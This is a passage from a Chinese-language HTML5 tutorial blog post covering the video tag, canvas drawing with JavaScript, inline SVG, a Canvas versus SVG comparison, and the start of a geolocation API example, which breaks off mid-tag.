id="使用-lt-video-gt-标签"><a href="#使用-lt-video-gt-标签" class="headerlink" title="使用 <video> 标签"></a>使用 <code>&lt;video&gt;</code> 标签</h4><p>显示一段嵌入网页的 ogg、mp4 或 webm 格式的视频。</p><p>它有以下属性：</p><table><thead><tr><th>属性</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>autoplay</td><td>autoplay</td><td>如果出现该属性，则视频在就绪后马上播放。</td></tr><tr><td>controls</td><td>controls</td><td>如果出现该属性，则向用户显示控件，比如播放按钮。</td></tr><tr><td>height</td><td><em>pixels</em></td><td>设置视频播放器的高度。</td></tr><tr><td>loop</td><td>loop</td><td>如果出现该属性，则当媒介文件完成播放后再次开始播放。</td></tr><tr><td>preload</td><td>preload</td><td>如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。</td></tr><tr><td>src</td><td><em>url</em></td><td>要播放的视频的 URL。</td></tr><tr><td>width</td><td><em>pixels</em></td><td>设置视频播放器的宽度。</td></tr></tbody></table><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>Your browser does not support the video tag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></code></pre><p>可以使用 DOM 进行控制视频的播放、暂停以及加载等。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> myVideo<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"video1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">playPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>myVideo<span class="token punctuation">.</span>paused<span class="token punctuation">)</span>             myVideo<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">else</span>             myVideo<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeBig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">560</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeSmall</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">320</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">420</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> </code></pre><h4 id="更好的方案-1"><a href="#更好的方案-1" class="headerlink" title="更好的方案"></a>更好的方案</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.swf<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></code></pre><p>使用了 4 种不同的视频格式。HTML 5 <code>&lt;video&gt;</code> 元素会尝试播放以 mp4、ogg 或 webm 格式中的一种来播放视频。如果均失败，则回退到 <code>&lt;embed&gt;</code> 元素。</p><p>当然，如果还不行，可以<strong>把视频上传到各大视频网站</strong>，然后<strong>嵌入视频</strong>就完事了。</p><hr><h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><p>HTML5 的 canvas 元素使用 JavaScript 在网页上<strong>绘制图像</strong>。</p><p>画布是一个矩形区域，您可以控制其每一像素。</p><p>canvas 拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。</p><h3 id="创建-canvas"><a href="#创建-canvas" class="headerlink" title="创建 canvas"></a>创建 canvas</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvasTest<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span></code></pre><p>canvas 元素本身是没有绘图能力的。所有的绘制工作必须在 JavaScript 内部完成。</p><p>比如绘制一个红色的矩形。</p><p>其中，<code>getContext("2d")</code> 对象是内建的 HTML5 对象，拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvasTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><canvas id="myCanvasTest" width="200" height="100"></canvas></p><script type="text/javascript">var c=document.getElementById("myCanvasTest");var cxt=c.getContext("2d");cxt.fillStyle="#FF0000";cxt.fillRect(0,0,150,75);</script><br><h3 id="坐标"><a href="#坐标" class="headerlink" title="坐标"></a>坐标</h3><p>左上角为 (0,0)，左到右为x轴正方向，上到下为y轴正方向，如下图所示。</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/canvas_coordinates.gif" alt="Canvas：理解坐标"></p><p>这里有个示例↓。</p><script type="text/javascript"> function cnvs_getCoordinates(e){x=e.clientX;y=e.clientY;document.getElementById("xycoordinates").innerHTML="Coordinates: (" + x + "," + y + ")";}function cnvs_clearCoordinates(){document.getElementById("xycoordinates").innerHTML="";}</script><p>把鼠标悬停在下面的矩形上可以看到坐标：</p><div id="coordiv" style="float:left;width:199px;height:99px;border:1px solid #c3c3c3" onmousemove="cnvs_getCoordinates(event)" onmouseout="cnvs_clearCoordinates()"></div><br><div id="xycoordinates"></div><br><br><h3 id="绘制线条"><a href="#绘制线条" class="headerlink" title="绘制线条"></a>绘制线条</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas1<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">lineTo</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">lineTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><canvas id="myCanvas" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas");    var cxt=c.getContext("2d");    cxt.moveTo(10,10);    cxt.lineTo(150,50);    cxt.lineTo(10,50);    cxt.stroke();</script><br><h3 id="绘制圆形"><a href="#绘制圆形" class="headerlink" title="绘制圆形"></a>绘制圆形</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas2<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>Math<span class="token punctuation">.</span>PI<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">closePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><canvas id="myCanvas2" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">var c=document.getElementById("myCanvas2");var cxt=c.getContext("2d");cxt.fillStyle="#FF0000";cxt.beginPath();cxt.arc(70,18,15,0,Math.PI*2,true);cxt.closePath();cxt.fill();</script><br><h3 id="绘制渐变背景"><a href="#绘制渐变背景" class="headerlink" title="绘制渐变背景"></a>绘制渐变背景</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas3<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> grd<span class="token operator">=</span>cxt<span class="token punctuation">.</span><span class="token function">createLinearGradient</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    grd<span class="token punctuation">.</span><span class="token function">addColorStop</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"#FF0000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    grd<span class="token punctuation">.</span><span class="token function">addColorStop</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"#00FF00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>grd<span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><canvas id="myCanvas3" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas3");    var cxt=c.getContext("2d");    var grd=cxt.createLinearGradient(0,0,175,50);    grd.addColorStop(0,"#FF0000");    grd.addColorStop(1,"#00FF00");    cxt.fillStyle=grd;    cxt.fillRect(0,0,175,50);</script><br><h3 id="放置图像"><a href="#放置图像" class="headerlink" title="放置图像"></a>放置图像</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas4<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> img<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    img<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"FrontEnd_HTML_Advanced/start_again.jpg"</span>    cxt<span class="token punctuation">.</span><span class="token function">drawImage</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><canvas id="myCanvas4" width="200" height="200" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas4");    var cxt=c.getContext("2d");    var img=new Image()    img.src="FrontEnd_HTML_Advanced/start_again.jpg"    cxt.drawImage(img,0,0);</script><br><hr><h2 id="内联-SVG"><a href="#内联-SVG" class="headerlink" title="内联 SVG"></a>内联 SVG</h2><p>SVG 指可伸缩矢量图形 (Scalable Vector Graphics)，用于定义用于网络的基于矢量的图形。<br>SVG 使用 XML 格式定义图形。SVG 图像在放大或改变尺寸的情况下其图形质量不会有损失。<br>SVG 是万维网联盟的标准。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>190<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100,10 40,180 190,60 10,60 160,180<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name">  <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">fill</span><span class="token punctuation">:</span>lime<span class="token punctuation">;</span><span class="token property">stroke</span><span class="token punctuation">:</span>purple<span class="token punctuation">;</span><span class="token property">stroke-width</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token property">fill-rule</span><span class="token punctuation">:</span>evenodd<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span></code></pre><svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="190">  <polygon points="100,10 40,180 190,60 10,60 160,180" style="fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;"></polygon></svg><br><p>SVG 本身就挺复杂的，也很强大，有专门的教程来学这个。</p><p>不过目前来说我还用不到呢，后面感兴趣再慢慢看吧。</p><hr><h2 id="Canvas-VS-SVG"><a href="#Canvas-VS-SVG" class="headerlink" title="Canvas VS SVG"></a>Canvas VS SVG</h2><h3 id="Canvas-1"><a href="#Canvas-1" class="headerlink" title="Canvas"></a>Canvas</h3><p>Canvas 通过 <strong>JavaScript</strong> 来绘制 2D 图形。</p><p>Canvas <strong>逐像素进行渲染</strong>。</p><p>在 canvas 中，一旦图形被绘制完成，它就<strong>不会</strong>继续得到浏览器的关注。</p><p>如果其位置发生变化，那么<strong>整个场景也需要重新绘制</strong>，包括任何或许已被图形覆盖的对象。</p><ul><li>依赖分辨率</li><li>不支持事件处理器</li><li>弱的文本渲染能力</li><li>能够以 .png 或 .jpg 格式保存结果图像</li><li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li></ul><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>SVG 是一种使用 <strong>XML</strong> 描述 2D 图形的语言。</p><p>SVG 基于 XML，这意味着 SVG DOM 中的<strong>每个元素都是可用的</strong>。<strong>可以为某个元素附加 JavaScript 事件处理器。</strong></p><p>在 SVG 中，每个被绘制的图形均被视为<strong>对象</strong>。如果 SVG 对象的属性发生变化，那么浏览器<strong>能够自动重现图形</strong>。</p><ul><li>不依赖分辨率</li><li>支持事件处理器</li><li>最适合带有大型渲染区域的应用程序（比如谷歌地图）</li><li>复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快）</li><li>不适合游戏应用</li></ul><hr><h2 id="地理定位"><a href="#地理定位" class="headerlink" title="地理定位"></a>地理定位</h2><p>HTML5 提供了一个获取用户位置信息的API。</p><p>当然这个需要用户的许可才行。</p><p><code>getCurrentPosition()</code> 方法可以用来获得用户的位置。如果能正常调用的话，会返回如下信息。</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>coords.latitude</td><td>十进制数的纬度</td></tr><tr><td>coords.longitude</td><td>十进制数的经度</td></tr><tr><td>coords.accuracy</td><td>位置精度</td></tr><tr><td>coords.altitude</td><td>海拔，海平面以上以米计</td></tr><tr><td>coords.altitudeAccuracy</td><td>位置的海拔精度</td></tr><tr><td>coords.heading</td><td>方向，从正北开始以度计</td></tr><tr><td>coords.speed</td><td>速度，以米/每秒计</td></tr><tr><td>timestamp</td><td>响应的日期/时间</td></tr></tbody></table><p>如果getCurrentPosition()运行成功，则向参数showPosition中规定的函数返回一个coordinates对象。</p><p>showPosition() 函数获得并显示经度和纬度。</p><p>getCurrentPosition() 方法的第二个参数用于<strong>处理错误</strong>。它规定当获取用户位置失败时运行的函数。<em>（类似于回调函数？）</em></p><p>showError() 函数用于处理错误。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>geolocation_demo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>点击这个按钮，将显示您的坐标：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token 